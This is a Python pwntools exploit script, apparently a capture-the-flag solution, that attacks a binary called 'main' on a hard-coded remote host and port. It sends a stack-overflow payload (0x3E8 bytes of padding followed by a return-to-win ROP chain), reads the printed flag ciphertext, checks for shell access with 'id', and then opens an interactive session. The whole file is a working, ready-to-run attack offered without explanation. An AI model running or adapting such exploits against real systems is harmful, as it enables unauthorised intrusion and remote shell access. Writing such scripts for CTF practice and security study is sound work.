from pwn import *

context.binary = elf = ELF("./main", checksec=False)
context.arch = "amd64"
context.log_level = args.LOG_LEVEL or "info"

HOST = args.HOST or "114.66.24.221"
PORT = int(args.PORT or 33235)
WIN = 0x401436
RET = 0x40101A
EXIT_PLT = 0x401320
OFFSET = 0x3E8


def start():
    env = {"LD_LIBRARY_PATH": "."}
    if args.GDB:
        return gdb.debug(
            [elf.path],
            env=env,
            gdbscript="""
            set pagination off
            b *0x4019c4
            c
            """,
        )
    if args.LOCAL:
        return process([elf.path], env=env)
    return remote(HOST, PORT)


def build_payload():
    return flat(
        b"\x00",
        b"A" * (OFFSET - 1),
        p64(RET),
        p64(WIN),
        p64(0),
        p64(EXIT_PLT),
    ) + b"\n"


def wait_for_shell(io):
    io.recvuntil(b"Enter plaintext in chars (max 64 chars):")
    io.send(build_payload())
    io.recvuntil(b"Flag Ciphertext (hex): ")
    flag_ct = io.recvline().strip()
    log.info(f"flag ciphertext = {flag_ct.decode()}")


io = start()
wait_for_shell(io)

if not args.INTERACTIVE:
    io.sendline(b"id")
    try:
        log.info(io.recvline(timeout=2).decode().strip())
    except EOFError:
        log.warning("shell command returned EOF")

io.interactive()
